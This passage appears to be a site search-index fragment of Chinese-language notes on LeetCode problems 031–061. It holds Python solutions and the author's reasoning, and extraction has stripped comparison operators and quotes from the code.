\u60f3\u6cd5 \u56de\u6eaf\uff1f \u9012\u5f52\uff1f \u770b\u4e86\u4e0b\u5176\u4ed6\u89e3\u6cd5\uff0c\u53d1\u73b0\u4f7f\u7528\u4e86\u662f\u5426\u9012\u589e\uff0c\u901a\u8fc7\u662f\u5426\u9012\u589e\u6765\u5224\u5b9a\u662f\u5426\u662f\u5168\u6392\u5217","title":"031"},{"location":"LeetCode/vol 0/031-040/#035","text":"\u7ed9\u5b9a\u4e00\u4e2a\u6392\u5e8f\u6570\u7ec4nums\u548c\u4e00\u4e2a\u6570val\uff0c\u5982\u679cval\u5728nums\u91cc\uff0c\u8fd4\u56de\u7d22\u5f15\uff1b\u5426\u5219\uff0c\u8fd4\u56de\u5e94\u8be5\u63d2\u5165\u7684\u4f4d\u7f6e\u7684\u7d22\u5f15","title":"035"},{"location":"LeetCode/vol 0/031-040/#_1","text":"\u4e8c\u5206\uff1f 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 class Solution : def searchInsert ( self , nums , target ): :type nums: List[int] :type target: int :rtype: int left = 0 right = len ( nums ) - 1 while left right : middle = ( right + left ) // 2 # middle = left + (right - left) // 2 if nums [ middle ] == target : return middle elif nums [ middle ] target : left = middle + 1 else : right = middle - 1 if target = nums [ left ]: return left else : return right + 1","title":"\u6cd5\u4e00"},{"location":"LeetCode/vol 0/031-040/#036","text":"\u5224\u5b9a\u4e00\u4e2a9*9\u7684\u6570\u72ec\u677f\u662f\u5426\u6709\u6548 \u6bcf\u6a2a\uff0c\u6bcf\u5217\uff0c\u6bcf3*3\u7684\u683c\u5b50\u5185\u90fd\u67091-9\u4e14\u4e0d\u91cd\u590d \u60f3\u6cd5 \u96be\u9053\u8981\u66b4\u529b\u904d\u5386\uff1f \u4e0d\u8fc7\u8fd9\u662f\u4e2d\u7b49\u9898\u3002\u3002\u3002\u3002emmmmm \u5bf9\u4e8e\u683c\u5b50\u6709 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 0 0,0 0,1 0,2 1,0 1,1 1,2 2,0 2,1 2,2 1 0,3 0,4 0,5 1,3 1,4 1,5 2,3 2,4 2,5 2 0,6 0,7 0,8 1,6 1,7 1,8 2,6 2,7 2,8 3 3,0 3,1 3,2 4,0 4,1 4,2 5,0 5,1 5,2","title":"036"},{"location":"LeetCode/vol 0/031-040/#_2","text":"\u66b4\u529b\u904d\u5386 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 class Solution : def isValidSudoku ( self , board ): :type board: List[List[str]] :rtype: bool for i in range ( 9 ): newList = [] for j in range ( 9 ): if board [ i ][ j ] != . : if board [ i ][ j ] in newList : return False else : newList . append ( board [ i ][ j ]) for j in range ( 9 ): newList = [] for i in range ( 9 ): if board [ i ][ j ] != . : if board [ i ][ j ] in newList : return False else : newList . append ( board [ i ][ j ]) for i in range ( 0 , 9 , 3 ): for j in range ( 0 , 9 , 3 ): newList = [] for newI in range ( 3 ): for newJ in range ( 3 ): if board [ i + newI ][ j + newJ ] != . : if board [ i + newI ][ j + newJ ] in newList : return False else : newList . append ( board [ i + newI ][ j + newJ ]) return True print ( Solution () . isValidSudoku ([ [ 5 , 3 , . , . , 7 , . , . , . , . ], [ 6 , . , . , 1 , 9 , 5 , . , . , . ], [ . , 9 , 8 , . , . , . , . , 6 , . ], [ 8 , . , . , . , 6 , . , . , . , 3 ], [ 4 , . , . , 8 , . , 3 , . , . , 1 ], [ 7 , . , . , . , 2 , . , . , . , 6 ], [ . , 6 , . , . , . , . , 2 , 8 , . ], [ . , . , . , 4 , 1 , 9 , . , . , 5 ], [ . , . , . , . , 8 , . , . , 7 , 9 ] ]))","title":"\u6cd5\u4e00"},{"location":"LeetCode/vol 0/031-040/#_3","text":"\u4ee3\u7801\u4f18\u96c5 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 class Solution : def isValidSudoku ( self , board ): :type board: List[List[str]] :rtype: bool seen = set () for i in range ( 0 , 9 ): for j in range ( 0 , 9 ): elem = board [ i ][ j ] if ( elem != . ): if (( i , elem ) in seen or ( elem , j ) in seen or ( i // 3 , j // 3 , elem ) in seen ): return False seen . add (( i , elem )) seen . add (( elem , j )) seen . add (( i // 3 , j // 3 , elem )) return True","title":"\u6cd5\u4e8c"},{"location":"LeetCode/vol 0/031-040/#037","text":"\u6570\u72ec\u6c42\u89e3\u5668 \u60f3\u6cd5 \u66b4\u529b DP \u56de\u6eaf \u9996\u5148\u662f\u66b4\u529b \u73b0\u7528python\u672c\u8eab\u7684\u51fd\u6570\u6765\u66b4\u529b\u4e00\u4e0b \u5988\u7684\u66b4\u529b\u66b4\u529b\u5c31\u6210\u56de\u6eaf\u4e86\u3002\u3002\u3002","title":"037"},{"location":"LeetCode/vol 0/031-040/#_4","text":"\u6839\u636e\u53c2\u8003\u8d44\u6599\uff0c\u8fd8\u662f\u56de\u6eaf\u6cd5 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 class Solution : def solveSudoku ( self , board ): :type board: List[List[str]] :rtype: void Do not return anything, modify board in-place instead. rows = [ set () for i in range ( 9 )] cols = [ set () for i in range ( 9 )] boxes = [ set () for i in range ( 9 )] empty = set () for i in range ( 9 ): for j in range ( 9 ): if board [ i ][ j ] == . : empty . add (( i , j )) continue n = board [ i ][ j ] #if n in rows[i] or n in cols[j] or n in boxes[(i//3)*3 + j//3] # return False rows [ i ] . add ( n ) cols [ j ] . add ( n ) boxes [( i // 3 ) * 3 + j // 3 ] . add ( n ) num = set ( 123456789 ) rows = [ num - row for row in rows ] cols = [ num - col for col in cols ] boxes = [ num - box for box in boxes ] result = self . DFS ( board , empty , rows , cols , boxes ) def DFS ( self , board , empty , rows , cols , boxes ): if len ( empty ) == 0 : return True maxpossible = 9 for r , c in empty : possible = rows [ r ] cols [ c ] boxes [( r // 3 ) * 3 + c // 3 ] if len ( possible ) maxpossible : maxpossible = len ( possible ) i , j = r , c if maxpossible == 0 : return False possible = rows [ i ] cols [ j ] boxes [( i // 3 ) * 3 + j // 3 ] empty . remove (( i , j )) for opt in possible : rows [ i ] . discard ( opt ) cols [ j ] . discard ( opt ) boxes [( i // 3 ) * 3 + j // 3 ] . discard ( opt ) board [ i ][ j ] = opt if self . DFS ( board , empty , rows , cols , boxes ): return True board [ i ][ j ] = . rows [ i ] . add ( opt ) cols [ j ] . add ( opt ) boxes [( i // 3 ) * 3 + j // 3 ] . add ( opt ) empty . add (( i , j )) return False","title":"\u6cd5\u4e00"},{"location":"LeetCode/vol 0/031-040/#_5","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 class Solution : def solveSudoku ( self , board ): self . board = board self . solve () def solve ( self ): # \u4e3b\u9012\u5f52\u51fd\u6570 row , col = self . findUnassigned () # \u83b7\u53d6\u4e00\u4e2a\u672a\u88ab\u5206\u914d\u7684\u65b9\u683c if row == - 1 and col == - 1 : # \u6ca1\u6709\u627e\u5230\uff0c\u8bf4\u660e\u5df2\u7ecf\u586b\u597d return True for num in [ 1 , 2 , 3 , 4 , 5 , 6 , 7 , 8 , 9 ]: if self . isSafe ( row , col , num ): # \u5faa\u73af\u586b\u5165\u6570\u5b57\uff0c\u5e76\u5224\u65ad\u662f\u5426\u6ee1\u8db3\u8981\u6c42 self . board [ row ][ col ] = num if self . solve (): # \u9012\u5f52\u8fdb\u5165\u4e0b\u4e00\u4e2a\u65b9\u683c return True self . board [ row ][ col ] = . # \u540e\u7eed\u4e0d\u6ee1\u8db3\uff0c\u90a3\u4e48\u73b0\u5728\u8981\u56de\u590d\u5f53\u524d\u73af\u5883\uff0c\u5e76\u8fdb\u884c\u4e0b\u4e00\u4e2a\u6570\u5b57\u8bd5\u63a2 return False def findUnassigned ( self ): # \u4f9d\u6b21\u67e5\u627e\u672a\u88ab\u5206\u914d\u7684\u65b9\u683c for row in range ( 9 ): for col in range ( 9 ): if self . board [ row ][ col ] == . : return row , col return - 1 , - 1 def isSafe ( self , row , col , ch ): # \u5224\u65ad\u662f\u5426\u5f53\u524d\u65b9\u683c\u586b\u5165\u7684\u6570\u5b57\u662f\u5426\u6ee1\u8db3\u8981\u6c42 boxrow = row - row % 3 # \u786e\u5b9a3x3\u5c0f\u5bab\u683c\u7684\u5f00\u59cb\u5750\u6807\uff0c\u5c31\u662f3x3\u5c0f\u5bab\u683c\u7b2c\u4e00\u4e2a\u65b9\u683c\u7d22\u5f15 boxcol = col - col % 3 if self . checkrow ( row , ch ) and self . checkcol ( col , ch ) and self . checksquare ( boxrow , boxcol , ch ): return True return False def checkrow ( self , row , ch ): # \u68c0\u67e5\u4e00\u884c\u662f\u5426\u7b26\u5408\u6761\u4ef6 for col in range ( 9 ): if self . board [ row ][ col ] == ch : return False return True def checkcol ( self , col , ch ): # \u68c0\u67e5\u4e00\u5217\u662f\u5426\u7b26\u5408\u6761\u4ef6 for row in range ( 9 ): if self . board [ row ][ col ] == ch : return False return True def checksquare ( self , row , col , ch ): # \u68c0\u67e53x3\u5c0f\u5bab\u683c\u662f\u5426\u7b26\u5408\u6761\u4ef6 for r in range ( row , row + 3 ): for c in range ( col , col + 3 ): if self . board [ r ][ c ] == ch : return False return True","title":"\u5176\u4ed6"},{"location":"LeetCode/vol 0/031-040/#038","text":"\u6570\u6570\u4e0e\u8bf4\uff0c\u9996\u5148\u7ed9\u51fa5\u4e2a\u6570\uff08hash\u5e8f\u5217\uff1f\u8fd8\u662f\u627e\u89c4\u5f8b\uff1f\uff09\uff0c\u7136\u540e\u7ed9\u5b9a\u4e00\u4e2a1\u523030\u7684\u6570n\uff0c\u8f93\u51fa\u5bf9\u5e94\u7684\u5e8f\u5217 1 2 3 4 5 1. 1 2. 11 # \u4e00\u4e2a1 3. 21 # \u4e24\u4e2a1 4. 1211 # \u4e00\u4e2a2\u4e24\u4e2a1 5. 111221 # \u4e00\u4e2a1\u4e00\u4e2a2\u4e24\u4e2a1 \u6839\u636e\u53c2\u8003\u8d44\u6599\u7684\u8bf4\u660e\uff0c\u5f97\u5230\u9898\u610f \u60f3\u6cd5 \u90a3\u4e48\u5c31\u662f\u9700\u8981\u9012\u5f52\u4e86\uff1f","title":"038"},{"location":"LeetCode/vol 0/031-040/#_6","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 class Solution : def countAndSay ( self , n ): :type n: int :rtype: str if n == 1 : return 1 # elif n == 2: # return 11 else : # \u589e\u52a0\u672b\u5c3e\u6807\u8bb0\u7b26\u53f7\uff0c\u6807\u8bc6\u672b\u5c3e lastString = self . countAndSay ( n - 1 ) + * res = count = 1 for i in range ( len ( lastString ) - 1 ): if lastString [ i ] == lastString [ i + 1 ]: count += 1 else : res = res + str ( count ) + lastString [ i ] count = 1 return res","title":"\u6cd5\u4e00"},{"location":"LeetCode/vol 0/031-040/#039","text":"Todo \u7ed9\u5b9a\u4e00\u4e2a\u6570\u7ec4nums\u548c\u4e00\u4e2a\u6570target\uff0c\u4ece\u6570\u7ec4\u4e2d\u51d1\u6570\u5b57\u4f7f\u5f97\u548c\u4e3atarget\uff0c\u5176\u4e2d\uff0cnums\u7684\u6570\u5b57\u53ef\u4ee5\u91cd\u590d 1 2 3 4 5 6 Input: candidates = [2,3,6,7], target = 7, A solution set is: [ [7], [2,2,3] ] \u60f3\u6cd5 \u4f7f\u7528dic\u6765\u8bb0\u5f55\uff1fdic[i]=set(list1,list2)=== dic[target]=set(list1,list2) \u8fd9\u79cd\u60f3\u6cd5\u9519\u8bef\uff0cset\u4e0d\u80fd\u4ee5list\u521d\u59cb\u5316\uff0clist\u4e0d\u53efhash \u90a3\u4e48\u53ea\u80fd\u8fd9\u6837\u4f7f\u7528:dic[i]=[sorted(list1),sorted(list2), ] \u5199\u662f\u53ef\u4ee5\uff0c\u4f46\u662f\u4f18\u5316\u4f59\u5730\u7279\u522b\u5927 \u90a3\u4e48\u8fd9\u6837\u904d\u5386\u7684\u601d\u60f3\u662f\u4e0d\u884c\u7684 \u6240\u4ee5\uff0c\u4f7f\u7528\u56de\u6eaf\uff0c\u6216\u8005\u9012\u5f52 \u5bf9\u4e8e\u9012\u5f52\u6765\u8bf4\uff0c\u7ec8\u6b62\u60c5\u51b5\u662f\uff0cdiff=target-num=0\uff1b\u6f14\u8fdb\u8fc7\u7a0b\u662f\uff0c\u4e0d\u65ad\u5bf9diff\u67e5\u627e\uff0c\u627e\u5230diff\u6240\u5c5e\u7684\u7b54\u6848\u540e\u5c06\u5176append","title":"039"},{"location":"LeetCode/vol 0/031-040/#_7","text":"\u5931\u8d25\uff0c\u4ee5\u540e\u518d\u8bf4 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 class Solution : def combinationSum ( self , candidates , target ): result = [] candidates = sorted ( candidates ) def combinationSum_helper ( diff , result_tmp ): if diff == 0 : result . append ( result_tmp ) for candidate in candidates : if candidate diff : break if candidates result_tmp [ - 1 ]: continue else : combinationSum_helper ( diff - candidate , result_tmp + [ candidates ]) combinationSum_helper ( target ,[]) return result","title":"\u8349\u7a3f"},{"location":"LeetCode/vol 0/031-040/#_8","text":"\u4f7f\u7528\u6df1\u5ea6\u641c\u7d22 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 class Solution : def combinationSum ( self , candidates , target ): result = [] candidates = sorted ( candidates ) def dfs ( remain , stack ): if remain == 0 : result . append ( stack ) return for item in candidates : if item remain : break # todo make the line clean if stack and item stack [ - 1 ]: continue else : dfs ( remain - item , stack + [ item ]) dfs ( target , []) return result","title":"\u5176\u4ed6"},{"location":"LeetCode/vol 0/051-060/","text":"053 \u627e\u5230\u6700\u5927\u8fde\u7eed\u5b50\u5e8f\u5217\u548c \u60f3\u6cd5 DP? DP[i] \u5b58\u653e\u5f53\u524d\u5f53\u524dindex\u7684\u7eed\u7684\u6700\u5927\u5b50\u5e8f\u5217\u548c DP[i] = (DP[i-1] 0 ? DP[i-1],0) + nums[i] \u6cd5\u4e00 1 2 3 4 5 6 7 8 9 10 11 class Solution : def maxSubArray ( self , nums ): :type nums: List[int] :rtype: int DP = [ 0 for _ in range ( len ( nums ))] DP [ 0 ] = nums [ 0 ] for i in range ( 1 , len ( nums )): DP [ i ] = ( DP [ i - 1 ] if DP [ i - 1 ] 0 else 0 ) + nums [ i ] return max ( DP ) 054 \u7ed9\u5b9a\u4e00\u4e2a\u6570\u7ec4\uff0c\u8fd4\u56de\u5b83\u7684\u87ba\u65cb\u904d\u5386 \u60f3\u6cd5 \u4f7f\u7528colStart,colEnd,rowStart,rowEnd\u6765\u63a7\u5236\u5faa\u73af\u6df1\u5ea6 \u6cd5\u4e00 \u901a\u8fc7\u66b4\u529b\u7684\u5faa\u73af\u68c0\u67e5\u6765\u63a7\u5236\u8fb9\u754c\u6761\u4ef6 \u867d\u7136\u5feb\uff0c\u4f46\u662f\u5185\u5b58\u6d88\u8017\u633a\u5927\u7684\uff0c\u6307\u51fb\u8d25\u4e869% \u800c\u4e14\u4e5f\u4e0d\u4f18\u96c5 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 class Solution : def spiralOrder ( self , matrix ): :type matrix: List[List[int]] :rtype: List[int] if len ( matrix ) == 0 : return [] rowStart = 0 rowEnd = len ( matrix ) - 1 colStart = 0 colEnd = len ( matrix [ 0 ]) - 1 res = [] while rowStart = rowEnd and colStart = colEnd : for j in range ( colStart , colEnd + 1 ): res . append ( matrix [ rowStart ][ j ]) rowStart += 1 if not ( rowStart = rowEnd and colStart = colEnd ): break for i in range ( rowStart , rowEnd + 1 ): res . append ( matrix [ i ][ colEnd ]) colEnd -= 1 if not ( rowStart = rowEnd and colStart = colEnd ): break for j in range ( colEnd , colStart - 1 , - 1 ): res . append ( matrix [ rowEnd ][ j ]) rowEnd -= 1 if not ( rowStart = rowEnd and colStart = colEnd ): break for i in range ( rowEnd , rowStart - 1 , - 1 ): res . append ( matrix [ i ][ colStart ]) colStart += 1 if not ( rowStart = rowEnd and colStart = colEnd ): break return res \u6cd5\u4e8c \u6bcf\u6b21\u987a\u65f6\u9488\u8f6c\u6362\u6210\u4e00\u4e2a\u65b0\u7684matrix\uff0c\u7136\u540epop\u4e4b 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 class Solution : def spiralOrder ( self , matrix ): :type matrix: List[List[int]] :rtype: List[int] spiral = [] while matrix : spiral += matrix . pop ( 0 ) if not matrix : break new = [] for i in range ( len ( matrix [ 0 ]) - 1 , - 1 , - 1 ): line = [] for j in range ( len ( matrix )): line . append ( matrix [ j ][ i ]) new . append ( line ) matrix = new return spiral 056 \u7ed9\u5b9a\u533a\u95f4\u7684\u96c6\u5408\uff0c\u5408\u5e76\u6240\u6709\u91cd\u590d\u7684\u533a\u95f4 1 2 3 Input: [[1,3],[2,6],[8,10],[15,18]] Output: [[1,6],[8,10],[15,18]] Explanation: Since intervals [1,3] and [2,6] overlaps, merge them into [1,6]. \u66b4\u529b\u5c31\u5b8c\u4e8b\u4e86 \u6cd5\u4e00 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 class Solution : def merge ( self , intervals ): :type intervals: List[Interval] :rtype: List[Interval] res = [] for interval in sorted ( intervals , key = lambda x : x . start ): # \u5982\u679c\u904d\u5386\u7684\u5b9a\u4e49\u57df\u7684start\u6bd4\u8bb0\u5f55\u7684\u5b9a\u4e49\u57df\u7684end\u5c0f # \u5373\u6ee1\u8db3\u91cd\u5408\u7684\u6761\u4ef6 if res and interval . start = res [ - 1 ] . end : res [ - 1 ] . end = max ( res [ - 1 ] . end , interval . end ) else : res . append ( interval ) return res 058 \u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32\u6700\u540e\u4e00\u4e2a\u5355\u8bcd\u7684\u957f\u5ea6 \u60f3\u6cd5 \u5148\u7528python\u81ea\u8eab\u7684\u51fd\u6570\u6765\u505a 1 2 3 4 class Solution : def lengthOfLastWord ( self , s : str ) - int : sLists = s . strip () . split ( ) return len ( sLists [ - 1 ]) v \u6cd5\u4e00 1 2 3 4 5 6 7 8 9 10 11 12 13 14 class Solution : def lengthOfLastWord ( self , s : str ) - int : if len ( s ) == 0 : return 0 index = len ( s ) - 1 while ( s [ index ] == \\n or s [ index ] == ) and index = 0 : index -= 1 res = 0 for i in range ( index , - 1 , - 1 ): if s [ i ] == : break else : res += 1 return res 059 \u9762\u8bd5\u7ecf\u5178\u9898 \u7ed9\u5b9a\u4e00\u4e2an\uff0c\u751f\u6210\u4e00\u4e2an^2\u7684\u87ba\u65cb\u77e9\u9635 \u66b4\u529b\u51fa\u5947\u8ff9 \u8003\u9a8c\u57fa\u672c\u7684\u8fb9\u754c\u95ee\u9898 \u6cd5\u4e00 \u66b4\u529b\u5c31\u5b8c\u4e8b\u4e86 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 class Solution : def generateMatrix ( self , n ): :type n: int :rtype: List[List[int]] if n == 0 : return [] res = [[ 0 for i in range ( n )] for i in range ( n )] rowStart , colStart = 0 , 0 rowEnd , colEnd = n - 1 , n - 1 num = 1 while rowStart = rowEnd and colStart = colEnd : for j in range ( colStart , colEnd + 1 ): res [ rowStart ][ j ] = num num += 1 rowStart += 1 for i in range ( rowStart , rowEnd + 1 ): res [ i ][ colEnd ] = num num += 1 colEnd -= 1 for j in range ( colEnd , colStart - 1 , - 1 ): res [ rowEnd ][ j ] = num num += 1 rowEnd -= 1 for i in range ( rowEnd , rowStart - 1 , - 1 ): res [ i ][ colStart ] = num num += 1 colStart += 1 return res 060 Todo \u7ed9\u5b9a\u4e24\u4e2a\u6570n\u548ck\uff0c\u6c42\u75311\uff0c2\uff0c\u2026\u2026\uff0cn\u6784\u6210\u7684n\u4e2a\u6570\u7ec4\u6210\u7b2ck\u4e2a\u5168\u6392\u5217 1 2 3 4 5 6 7 8 9 10 By listing and labeling all of the permutations in order, we get the following sequence for n = 3: 123 132 213 231 312 321 Given n and k, return the kth permutation sequence. \u60f3\u6cd5 \u6240\u4ee5\u8fd8\u662f\u9003\u4e0d\u5f00\u5168\u6392\u5217 \u5168\u6392\u5217\u7684\u516c\u5f0f\u4e3a A^m_n=\\frac{n!}{(n-m)!} A^m_n=\\frac{n!}{(n-m)!} \uff0c\u6240\u4ee5 A^n_n=n! A^n_n=n! \u4ee51\u5f00\u5934\u7684\u6392\u5217\u6709 (n-1)! (n-1)! \u4e2a \u4ee52\u5f00\u5934\u7684\u6392\u5217\u4e5f\u6709 (n-1)! (n-1)! \u4e2a \u6839\u636e\u7ed9\u5b9a\u7684k\u786e\u5b9a\u662f\u4ec0\u4e48\u6570\u5b57\u5f00\u5934\uff1f\u9012\u5f52\uff1f \u8bd5\u8bd5","title":"051 060"},{"location":"LeetCode/vol 0/051-060/#053","text":"\u627e\u5230\u6700\u5927\u8fde\u7eed\u5b50\u5e8f\u5217\u548c \u60f3\u6cd5 DP? DP[i] \u5b58\u653e\u5f53\u524d\u5f53\u524dindex\u7684\u7eed\u7684\u6700\u5927\u5b50\u5e8f\u5217\u548c DP[i] = (DP[i-1] 0 ? DP[i-1],0) + nums[i]","title":"053"},{"location":"LeetCode/vol 0/051-060/#_1","text":"1 2 3 4 5 6 7 8 9 10 11 class Solution : def maxSubArray ( self , nums ): :type nums: List[int] :rtype: int DP = [ 0 for _ in range ( len ( nums ))] DP [ 0 ] = nums [ 0 ] for i in range ( 1 , len ( nums )): DP [ i ] = ( DP [ i - 1 ] if DP [ i - 1 ] 0 else 0 ) + nums [ i ] return max ( DP )","title":"\u6cd5\u4e00"},{"location":"LeetCode/vol 0/051-060/#054","text":"\u7ed9\u5b9a\u4e00\u4e2a\u6570\u7ec4\uff0c\u8fd4\u56de\u5b83\u7684\u87ba\u65cb\u904d\u5386 \u60f3\u6cd5 \u4f7f\u7528colStart,colEnd,rowStart,rowEnd\u6765\u63a7\u5236\u5faa\u73af\u6df1\u5ea6","title":"054"},{"location":"LeetCode/vol 0/051-060/#_2","text":"\u901a\u8fc7\u66b4\u529b\u7684\u5faa\u73af\u68c0\u67e5\u6765\u63a7\u5236\u8fb9\u754c\u6761\u4ef6 \u867d\u7136\u5feb\uff0c\u4f46\u662f\u5185\u5b58\u6d88\u8017\u633a\u5927\u7684\uff0c\u6307\u51fb\u8d25\u4e869% \u800c\u4e14\u4e5f\u4e0d\u4f18\u96c5 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 class Solution : def spiralOrder ( self , matrix ): :type matrix: List[List[int]] :rtype: List[int] if len ( matrix ) == 0 : return [] rowStart = 0 rowEnd = len ( matrix ) - 1 colStart = 0 colEnd = len ( matrix [ 0 ]) - 1 res = [] while rowStart = rowEnd and colStart = colEnd : for j in range ( colStart , colEnd + 1 ): res . append ( matrix [ rowStart ][ j ]) rowStart += 1 if not ( rowStart = rowEnd and colStart = colEnd ): break for i in range ( rowStart , rowEnd + 1 ): res . append ( matrix [ i ][ colEnd ]) colEnd -= 1 if not ( rowStart = rowEnd and colStart = colEnd ): break for j in range ( colEnd , colStart - 1 , - 1 ): res . append ( matrix [ rowEnd ][ j ]) rowEnd -= 1 if not ( rowStart = rowEnd and colStart = colEnd ): break for i in range ( rowEnd , rowStart - 1 , - 1 ): res . append ( matrix [ i ][ colStart ]) colStart += 1 if not ( rowStart = rowEnd and colStart = colEnd ): break return res","title":"\u6cd5\u4e00"},{"location":"LeetCode/vol 0/051-060/#_3","text":"\u6bcf\u6b21\u987a\u65f6\u9488\u8f6c\u6362\u6210\u4e00\u4e2a\u65b0\u7684matrix\uff0c\u7136\u540epop\u4e4b 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 class Solution : def spiralOrder ( self , matrix ): :type matrix: List[List[int]] :rtype: List[int] spiral = [] while matrix : spiral += matrix . pop ( 0 ) if not matrix : break new = [] for i in range ( len ( matrix [ 0 ]) - 1 , - 1 , - 1 ): line = [] for j in range ( len ( matrix )): line . append ( matrix [ j ][ i ]) new . append ( line ) matrix = new return spiral","title":"\u6cd5\u4e8c"},{"location":"LeetCode/vol 0/051-060/#056","text":"\u7ed9\u5b9a\u533a\u95f4\u7684\u96c6\u5408\uff0c\u5408\u5e76\u6240\u6709\u91cd\u590d\u7684\u533a\u95f4 1 2 3 Input: [[1,3],[2,6],[8,10],[15,18]] Output: [[1,6],[8,10],[15,18]] Explanation: Since intervals [1,3] and [2,6] overlaps, merge them into [1,6]. \u66b4\u529b\u5c31\u5b8c\u4e8b\u4e86","title":"056"},{"location":"LeetCode/vol 0/051-060/#_4","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 class Solution : def merge ( self , intervals ): :type intervals: List[Interval] :rtype: List[Interval] res = [] for interval in sorted ( intervals , key = lambda x : x . start ): # \u5982\u679c\u904d\u5386\u7684\u5b9a\u4e49\u57df\u7684start\u6bd4\u8bb0\u5f55\u7684\u5b9a\u4e49\u57df\u7684end\u5c0f # \u5373\u6ee1\u8db3\u91cd\u5408\u7684\u6761\u4ef6 if res and interval . start = res [ - 1 ] . end : res [ - 1 ] . end = max ( res [ - 1 ] . end , interval . end ) else : res . append ( interval ) return res","title":"\u6cd5\u4e00"},{"location":"LeetCode/vol 0/051-060/#058","text":"\u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32\u6700\u540e\u4e00\u4e2a\u5355\u8bcd\u7684\u957f\u5ea6 \u60f3\u6cd5 \u5148\u7528python\u81ea\u8eab\u7684\u51fd\u6570\u6765\u505a 1 2 3 4 class Solution : def lengthOfLastWord ( self , s : str ) - int : sLists = s . strip () . split ( ) return len ( sLists [ - 1 ]) v","title":"058"},{"location":"LeetCode/vol 0/051-060/#_5","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 class Solution : def lengthOfLastWord ( self , s : str ) - int : if len ( s ) == 0 : return 0 index = len ( s ) - 1 while ( s [ index ] == \\n or s [ index ] == ) and index = 0 : index -= 1 res = 0 for i in range ( index , - 1 , - 1 ): if s [ i ] == : break else : res += 1 return res","title":"\u6cd5\u4e00"},{"location":"LeetCode/vol 0/051-060/#059","text":"\u9762\u8bd5\u7ecf\u5178\u9898 \u7ed9\u5b9a\u4e00\u4e2an\uff0c\u751f\u6210\u4e00\u4e2an^2\u7684\u87ba\u65cb\u77e9\u9635 \u66b4\u529b\u51fa\u5947\u8ff9 \u8003\u9a8c\u57fa\u672c\u7684\u8fb9\u754c\u95ee\u9898","title":"059"},{"location":"LeetCode/vol 0/051-060/#_6","text":"\u66b4\u529b\u5c31\u5b8c\u4e8b\u4e86 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 class Solution : def generateMatrix ( self , n ): :type n: int :rtype: List[List[int]] if n == 0 : return [] res = [[ 0 for i in range ( n )] for i in range ( n )] rowStart , colStart = 0 , 0 rowEnd , colEnd = n - 1 , n - 1 num = 1 while rowStart = rowEnd and colStart = colEnd : for j in range ( colStart , colEnd + 1 ): res [ rowStart ][ j ] = num num += 1 rowStart += 1 for i in range ( rowStart , rowEnd + 1 ): res [ i ][ colEnd ] = num num += 1 colEnd -= 1 for j in range ( colEnd , colStart - 1 , - 1 ): res [ rowEnd ][ j ] = num num += 1 rowEnd -= 1 for i in range ( rowEnd , rowStart - 1 , - 1 ): res [ i ][ colStart ] = num num += 1 colStart += 1 return res","title":"\u6cd5\u4e00"},{"location":"LeetCode/vol 0/051-060/#060","text":"Todo \u7ed9\u5b9a\u4e24\u4e2a\u6570n\u548ck\uff0c\u6c42\u75311\uff0c2\uff0c\u2026\u2026\uff0cn\u6784\u6210\u7684n\u4e2a\u6570\u7ec4\u6210\u7b2ck\u4e2a\u5168\u6392\u5217 1 2 3 4 5 6 7 8 9 10 By listing and labeling all of the permutations in order, we get the following sequence for n = 3: 123 132 213 231 312 321 Given n and k, return the kth permutation sequence. \u60f3\u6cd5 \u6240\u4ee5\u8fd8\u662f\u9003\u4e0d\u5f00\u5168\u6392\u5217 \u5168\u6392\u5217\u7684\u516c\u5f0f\u4e3a A^m_n=\\frac{n!}{(n-m)!} A^m_n=\\frac{n!}{(n-m)!} \uff0c\u6240\u4ee5 A^n_n=n! A^n_n=n! \u4ee51\u5f00\u5934\u7684\u6392\u5217\u6709 (n-1)! (n-1)! \u4e2a \u4ee52\u5f00\u5934\u7684\u6392\u5217\u4e5f\u6709 (n-1)! (n-1)! \u4e2a \u6839\u636e\u7ed9\u5b9a\u7684k\u786e\u5b9a\u662f\u4ec0\u4e48\u6570\u5b57\u5f00\u5934\uff1f\u9012\u5f52\uff1f \u8bd5\u8bd5","title":"060"},{"location":"LeetCode/vol 0/061-070/","text":"061 \u770b\u6837\u5b50\u662f\u7ed9\u5b9a\u4e00\u4e2a\u94fe\u8868\uff0c\u4ece\u5012\u6570\u7b2ck\u4e2a\u8282\u70b9\u540e\u7ffb\u8f6c 1 2 3 4 5 6 7 8 9 10 11 12 13 Input: 1- 2- 3- 4- 5- NULL, k = 2 Output: 4- 5- 1- 2- 3- NULL Explanation: rotate 1 steps to the right: 5- 1- 2- 3- 4- NULL 